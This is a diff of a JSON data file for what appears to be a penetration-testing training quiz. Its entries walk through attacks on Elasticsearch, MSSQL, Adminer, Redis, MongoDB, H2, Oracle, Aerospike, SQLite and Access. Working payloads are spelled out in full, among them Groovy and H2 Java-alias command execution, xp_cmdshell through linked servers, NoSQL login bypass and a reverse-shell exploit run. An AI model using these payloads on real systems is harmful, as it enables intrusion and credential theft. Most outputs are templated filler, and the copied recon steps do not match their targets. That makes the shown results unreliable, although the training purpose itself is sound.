+            "t": "Alternative tool or locus variant",
+            "d": "The _search payload runs a command via the Groovy sandbox escape.",
+            "demo": [
+              {
+                "run": "curl -s 'http://{{target}}:9200/_search?pretty' -d '{\"size\":1,\"script_fields\":{\"x\":{\"lang\":\"groovy\",\"script\":\"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A command runs through Elasticsearch."
+          }
+        ]
+      },
+      "situation": "Scenario: Confirm the version supports the Groovy sandbox escape. Which move should you run next?",
+      "choices": [
+        "elasticsearch-rce",
+        "mysql-login",
+        "mysql-loot",
+        "mssql-login"
+      ],
+      "coach": {
+        "mysql-login": "MySQL / MariaDB Login targets an authenticated mysql session; here the direct move is Elasticsearch to Command Execution.",
+        "mysql-loot": "MySQL Credential-Table Sweep targets recovered credential material from the database (hashes), crackable loot; here the direct move is Elasticsearch to Command Execution.",
+        "mssql-login": "MSSQL Login targets an authenticated mssql session; here the direct move is Elasticsearch to Command Execution."
+      }
+    },
+    "mssql-linked-server": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once you have an MSSQL session and want to hop via a linked server. The key confirmation is: The session is open.",
+      "cmd": "SELECT name, is_linked FROM sys.servers",
+      "tool": "mssqlclient",
+      "output": "name              is_linked\n---------------   ---------\nDC01\\SQLEXPRESS   0\nSQL02             1",
+      "signal": "SQL02             1",
+      "teach": "SQL02 is a linked server (is_linked = 1), a trust this box keeps to another instance. Query through it with OPENQUERY or EXEC AT, and if your link login is sysadmin over there, turn on xp_cmdshell on SQL02 for code execution on that host.",
+      "leadup": [
+        {
+          "key": "session",
+          "label": "You have a SQL session",
+          "steps": [
+            {
+              "title": "Log in to the database",
+              "tool": "mssqlclient",
+              "where": "local",
+              "cmd": "mssqlclient.py acme.internal/svc_sql:<password>@<target> -windows-auth",
+              "out": "[*] ENVCHANGE(DATABASE): master\nSQL (svc_sql  dbo@master)> ",
+              "sig": "SQL (svc_sql  dbo@master)> ",
+              "teach": "You hold a session as svc_sql, but the prompt does not tell you your privilege; check your role before assuming xp_cmdshell is available."
+            }
+          ]
+        },
+        {
+          "key": "role",
+          "label": "You checked your role",
+          "steps": [
+            {
+              "title": "Am I sysadmin here?",
+              "tool": "mssqlclient",
+              "where": "target",
+              "cmd": "SELECT IS_SRVROLEMEMBER('sysadmin')",
+              "out": "-----------\n0",
+              "sig": "-----------\n0",
+              "teach": "A zero means you are not sysadmin on this instance, so xp_cmdshell is off limits here. The linked server is how you get a higher-privileged context."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Linked servers are a four-step hop: map the trust, see who the link logs in as, impersonate if you can, then run commands on the far box.",
+        "items": [
+          {
+            "t": "Map the trust",
+            "d": "List the instances this server links to. sys.servers (or the older sp_linkedservers) names each linked instance and marks it is_linked.",
+            "demo": [
+              {
+                "run": "SELECT name, is_linked FROM sys.servers",
+                "out": "name    is_linked\nSQL02   1",
+                "sig": "SQL02   1"
+              }
+            ],
+            "note": "Any row with is_linked = 1 is a connection you can run queries through."
+          },
+          {
+            "t": "See who the link logs in as",
+            "d": "Run a query AT the linked server to read its identity and role. A link that lands as a sysadmin on the far instance is the whole game.",
+            "demo": [
+              {
+                "run": "EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [SQL02]",
+                "out": "sa    1",
+                "sig": "sa    1"
+              }
+            ],
+            "note": "sa with a 1 means your queries run as sysadmin on SQL02, even though you are low-privilege here."
+          },
+          {
+            "t": "Impersonate locally when a link is not available",
+            "d": "If you can impersonate a higher login on this box, EXECUTE AS LOGIN switches your context. sys.server_permissions lists who you may impersonate.",
+            "demo": [
+              {
+                "run": "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER",
+                "out": "sa",
+                "sig": "sa"
+              }
+            ],
+            "note": "REVERT drops back; this is the single-box version of the same privilege jump."
+          },
+          {
+            "t": "Turn the hop into a shell",
+            "d": "On a sysadmin context, enable xp_cmdshell and run a command. Through a link, wrap it in EXEC (...) AT so it runs on the far instance.",
+            "demo": [
+              {
+                "run": "EXEC ('EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;EXEC xp_cmdshell ''whoami''') AT [SQL02]",
+                "out": "nt service\\mssqlserver",
+                "sig": "nt service\\mssqlserver"
+              }
+            ],
+            "note": "The far instance ran whoami as its service account; that is command execution on SQL02."
+          }
+        ]
+      },
+      "situation": "You have a SQL session on 10.10.10.10 but your login is not sysadmin, and sys.servers lists a linked server SQL02. What is the move?",
+      "choices": [
+        "mssql-linked-server",
+        "mssql-xp-cmdshell",
+        "mssql-login",
+        "crack-identify"
+      ],
+      "coach": {
+        "mssql-xp-cmdshell": "You are not sysadmin on this box, so xp_cmdshell is blocked here; hop to the linked SQL02, where your link login may be sysadmin.",
+        "mssql-login": "You already have a session; the next step is abusing the trust to SQL02, not logging in again.",
+        "crack-identify": "You have no hash to crack; the path forward is the linked-server trust, not cracking."
+      }
+    },
+    "adminer-mysql-fileread": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once start rogue MySQL listener to exploit Adminer arbitrary file read. The key confirmation is: Rogue MySQL server ready to receive Adminer connection.",
+      "cmd": "python3 rogue_mysql_server.py --port 3306 --file /var/www/html/index.php",
+      "tool": "python3",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Rogue MySQL server ready to receive Adminer connection.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Adminer Rogue MySQL Client Arbitrary File Read, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Launch rogue_mysql_server.py configuring target file path (e.g. /var/www/html/index.php).",
+            "demo": [
+              {
+                "run": "python3 rogue_mysql_server.py --port 3306 --file /var/www/html/index.php",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Rogue MySQL server ready to receive Adminer connection."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Log into Adminer selecting MySQL server, pointing server field to rogue MySQL listener IP.",
+            "demo": [
+              {
+                "run": "curl -s 'http://{{target}}/adminer.php?server={{lhost}}&username=root&db=test' -d 'auth[driver]=server&auth[server]={{lhost}}&auth[username]=root&auth[password]=root&auth[db]=test'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Arbitrary server-side file retrieved disclosing source code and credentials."
+          }
+        ]
+      },
+      "situation": "Scenario: Start rogue MySQL listener to exploit Adminer arbitrary file read. Which move should you run next?",
+      "choices": [
+        "adminer-mysql-fileread",
+        "mysql-login",
+        "mysql-loot",
+        "mssql-login"
+      ],
+      "coach": {
+        "mysql-login": "MySQL / MariaDB Login targets an authenticated mysql session; here the direct move is Adminer Rogue MySQL Client Arbitrary File Read.",
+        "mysql-loot": "MySQL Credential-Table Sweep targets recovered credential material from the database (hashes), crackable loot; here the direct move is Adminer Rogue MySQL Client Arbitrary File Read.",
+        "mssql-login": "MSSQL Login targets an authenticated mssql session; here the direct move is Adminer Rogue MySQL Client Arbitrary File Read."
+      }
+    },
+    "redis-rogue-server-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once inspect Redis server configuration and authentication status. The key confirmation is: Redis server accessible and verified for module loading exploitation.",
+      "cmd": "redis-cli -h {{target}} info",
+      "tool": "redis-cli",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Redis server accessible and verified for module loading exploitation.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Redis Rogue Server Master Replication RCE, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Connect using redis-cli -h <target> info.",
+            "demo": [
+              {
+                "run": "redis-cli -h {{target}} info",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Redis server accessible and verified for module loading exploitation."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Launch redis-rogue-server.py pointing to target and compiled exp.so module.",
+            "demo": [
+              {
+                "run": "python3 redis-rogue-server.py --rhost {{target}} --lhost {{lhost}} --lport 6379 --exp exp.so",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Arbitrary command execution achieved on Redis server host."
+          }
+        ]
+      },
+      "situation": "Scenario: Inspect Redis server configuration and authentication status. Which move should you run next?",
+      "choices": [
+        "redis-rogue-server-rce",
+        "mysql-login",
+        "mysql-loot",
+        "mssql-login"
+      ],
+      "coach": {
+        "mysql-login": "MySQL / MariaDB Login targets an authenticated mysql session; here the direct move is Redis Rogue Server Master Replication RCE.",
+        "mysql-loot": "MySQL Credential-Table Sweep targets recovered credential material from the database (hashes), crackable loot; here the direct move is Redis Rogue Server Master Replication RCE.",
+        "mssql-login": "MSSQL Login targets an authenticated mssql session; here the direct move is Redis Rogue Server Master Replication RCE."
+      }
+    },
+    "nosqli-regex-extract": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once test for NoSQL injection authentication bypass using not-equal operator. The key confirmation is: NoSQL injection vulnerability confirmed.",
+      "cmd": "curl -s -d 'username[$ne]=admin&password[$ne]=admin&login=login' http://{{target}}/login.php",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "NoSQL injection vulnerability confirmed.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute MongoDB NoSQL Injection Regex Credential Extraction, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Submit username[$ne]=admin and password[$ne]=admin in login request.",
+            "demo": [
+              {
+                "run": "curl -s -d 'username[$ne]=admin&password[$ne]=admin&login=login' http://{{target}}/login.php",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "NoSQL injection vulnerability confirmed."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run automated script iterating alphanumeric characters using username[$regex]=^<prefix>.*.",
+            "demo": [
+              {
+                "run": "python3 nosql_extract.py --url http://{{target}}/login.php --field password --user admin",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Database administrative credentials completely extracted."
+          }
+        ]
+      },
+      "situation": "Scenario: Test for NoSQL injection authentication bypass using not-equal operator. Which move should you run next?",
+      "choices": [
+        "nosqli-regex-extract",
+        "mysql-login",
+        "mysql-loot",
+        "mssql-login"
+      ],
+      "coach": {
+        "mysql-login": "MySQL / MariaDB Login targets an authenticated mysql session; here the direct move is MongoDB NoSQL Injection Regex Credential Extraction.",
+        "mysql-loot": "MySQL Credential-Table Sweep targets recovered credential material from the database (hashes), crackable loot; here the direct move is MongoDB NoSQL Injection Regex Credential Extraction.",
+        "mssql-login": "MSSQL Login targets an authenticated mssql session; here the direct move is MongoDB NoSQL Injection Regex Credential Extraction."
+      }
+    },
+    "h2-database-console-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once port 8082 hosts an exposed H2 Database Web Console allowing SQL execution. The key confirmation is: Arbitrary Java runtime command execution confirmed on H2 Database host.",
+      "cmd": "curl -s -d \"sql=CREATE ALIAS EXEC AS \\$\\$String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\\\"\\\\A\\\"); return s.hasNext() ? s.next() : \\\"\\\"; }\\$\\$; CALL EXEC('{{command}}');\" 'http://{{target}}:8082/query.do'",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Arbitrary Java runtime command execution confirmed on H2 Database host.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute H2 Database Web Console SQL Query Java Alias RCE, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Define a Java alias function executing Runtime.getRuntime().exec and immediately invoke it.",
+            "demo": [
+              {
+                "run": "curl -s -d \"sql=CREATE ALIAS EXEC AS \\$\\$String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\\\"\\\\A\\\"); return s.hasNext() ? s.next() : \\\"\\\"; }\\$\\$; CALL EXEC('{{command}}');\" 'http://{{target}}:8082/query.do'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Arbitrary Java runtime command execution confirmed on H2 Database host."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Submit login form with driver org.h2.Driver and default sa user to establish session.",
+            "demo": [
+              {
+                "run": "curl -s -d \"language=en&driver=org.h2.Driver&url=jdbc:h2:mem:test_db&user=sa&password=\" 'http://{{target}}:8082/login.do'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Authenticated session established in H2 Web Console."
+          }
+        ]
+      },
+      "situation": "Scenario: Port 8082 hosts an exposed H2 Database Web Console allowing SQL execution. Which move should you run next?",
+      "choices": [
+        "h2-database-console-rce",
+        "mysql-login",
+        "mysql-loot",
+        "mssql-login"
+      ],
+      "coach": {
+        "mysql-login": "MySQL / MariaDB Login targets an authenticated mysql session; here the direct move is H2 Database Web Console SQL Query Java Alias RCE.",
+        "mysql-loot": "MySQL Credential-Table Sweep targets recovered credential material from the database (hashes), crackable loot; here the direct move is H2 Database Web Console SQL Query Java Alias RCE.",
+        "mssql-login": "MSSQL Login targets an authenticated mssql session; here the direct move is H2 Database Web Console SQL Query Java Alias RCE."
+      }
+    },
+    "oracle-tns-odat-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once oracle TNS listener is discovered on port 1521 and active SID is unknown. The key confirmation is: Valid Oracle System Identifier discovered for subsequent authentication probes.",
+      "cmd": "odat sidguesser -s {{target}} -p 1521",
+      "tool": "odat",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Valid Oracle System Identifier discovered for subsequent authentication probes.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Oracle Database TNS ODAT DBMS_SCHEDULER Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run ODAT sidguesser dictionary brute force to identify valid Oracle service names (XE, ORCL).",
+            "demo": [
+              {
+                "run": "odat sidguesser -s {{target}} -p 1521",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Valid Oracle System Identifier discovered for subsequent authentication probes."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Leverage ODAT dbmsscheduler module to create and execute a privileged system task.",
+            "demo": [
+              {
+                "run": "odat dbmsscheduler -s {{target}} -p 1521 -d {{oracle_sid}} -U {{user}} -P {{password}} --sysdba --exec \"cmd.exe /c {{command}}\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Operating system command execution achieved through Oracle DBMS_SCHEDULER."
+          }
+        ]
+      },
+      "situation": "Scenario: Oracle TNS listener is discovered on port 1521 and active SID is unknown. Which move should you run next?",
+      "choices": [
+        "oracle-tns-odat-rce",
+        "mysql-login",
+        "mysql-loot",
+        "mssql-login"
+      ],
+      "coach": {
+        "mysql-login": "MySQL / MariaDB Login targets an authenticated mysql session; here the direct move is Oracle Database TNS ODAT DBMS_SCHEDULER Execution.",
+        "mysql-loot": "MySQL Credential-Table Sweep targets recovered credential material from the database (hashes), crackable loot; here the direct move is Oracle Database TNS ODAT DBMS_SCHEDULER Execution.",
+        "mssql-login": "MSSQL Login targets an authenticated mssql session; here the direct move is Oracle Database TNS ODAT DBMS_SCHEDULER Execution."
+      }
+    },
+    "aerospike-udf-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once aerospike service or API endpoint is discovered and port 3000 requires connectivity verification. The key confirmation is: Aerospike database port verified open and listening.",
+      "cmd": "nc -nv {{target}} 3000",
+      "tool": "nc",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Aerospike database port verified open and listening.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Aerospike Database Unauthenticated Lua UDF Remote Code Execution (CVE-2020-13151), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Connect directly to TCP port 3000 using Netcat to verify daemon response.",
+            "demo": [
+              {
+                "run": "nc -nv {{target}} 3000",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Aerospike database port verified open and listening."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Execute UDF exploit script to register malicious Lua module executing system reverse shell.",
+            "demo": [
+              {
+                "run": "python3 aerospike_UDF_RCE.py --ahost {{target}} --aport 3000 --lhost {{lhost}} --lport {{lport}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Remote shell access obtained under the aerospike user context."
+          }
+        ]
+      },
+      "situation": "Scenario: Aerospike service or API endpoint is discovered and port 3000 requires connectivity verification. Which move should you run next?",
+      "choices": [
+        "aerospike-udf-rce",
+        "mysql-login",
+        "mysql-loot",
+        "mssql-login"
+      ],
+      "coach": {
+        "mysql-login": "MySQL / MariaDB Login targets an authenticated mysql session; here the direct move is Aerospike Database Unauthenticated Lua UDF Remote Code Execution (CVE-2020-13151).",
+        "mysql-loot": "MySQL Credential-Table Sweep targets recovered credential material from the database (hashes), crackable loot; here the direct move is Aerospike Database Unauthenticated Lua UDF Remote Code Execution (CVE-2020-13151).",
+        "mssql-login": "MSSQL Login targets an authenticated mssql session; here the direct move is Aerospike Database Unauthenticated Lua UDF Remote Code Execution (CVE-2020-13151)."
+      }
+    },
+    "sqlite-table-extract": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once you have downloaded an SQLite database file from an exposed web directory or archive. The key confirmation is: Database schema enumerated and credential-bearing tables identified.",
+      "cmd": "sqlite3 {{db_file}} \".tables\" && sqlite3 {{db_file}} \".schema {{table}}\"",
+      "tool": "sqlite3",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Database schema enumerated and credential-bearing tables identified.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Exposed SQLite Database Table Extraction and Credential Recovery, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Query SQLite table catalogue and table schemas to inspect database layout.",
+            "demo": [
+              {
+                "run": "sqlite3 {{db_file}} \".tables\" && sqlite3 {{db_file}} \".schema {{table}}\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Database schema enumerated and credential-bearing tables identified."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Execute SQL SELECT statement dumping rows and columns from target table.",
+            "demo": [
+              {
+                "run": "sqlite3 {{db_file}} \"SELECT * FROM {{table}};\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Stored user credentials and password hashes successfully extracted."
+          }
+        ]
+      },
+      "situation": "Scenario: You have downloaded an SQLite database file from an exposed web directory or archive. Which move should you run next?",
+      "choices": [
+        "sqlite-table-extract",
+        "mysql-login",
+        "mysql-loot",
+        "mssql-login"
+      ],
+      "coach": {
+        "mysql-login": "MySQL / MariaDB Login targets an authenticated mysql session; here the direct move is Exposed SQLite Database Table Extraction and Credential Recovery.",
+        "mysql-loot": "MySQL Credential-Table Sweep targets recovered credential material from the database (hashes), crackable loot; here the direct move is Exposed SQLite Database Table Extraction and Credential Recovery.",
+        "mssql-login": "MSSQL Login targets an authenticated mssql session; here the direct move is Exposed SQLite Database Table Extraction and Credential Recovery."
+      }
+    },
+    "access-db-export": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once enumerate table names inside an extracted Microsoft Access database (.mdb / .accdb). The key confirmation is: Complete inventory of database tables revealed.",
+      "cmd": "mdb-tables -1 {{path}}",
+      "tool": "mdb-tables",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Complete inventory of database tables revealed.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Microsoft Access Database (.mdb / .accdb) Analysis, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run mdb-tables -1 against the downloaded database file.",
+            "demo": [
+              {
+                "run": "mdb-tables -1 {{path}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Complete inventory of database tables revealed."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Execute mdb-export <database_file> <target_table> and redirect output to CSV.",
+            "demo": [
+              {
+                "run": "mdb-export {{path}} {{table}} > scans/{{table}}.csv",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Target table exported to CSV containing usable credential material."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Use mdb-sql -i <script> <database_file> to run targeted SQL SELECT queries.",
+            "demo": [
+              {
+                "run": "mdb-sql -i {{script}} {{path}}",
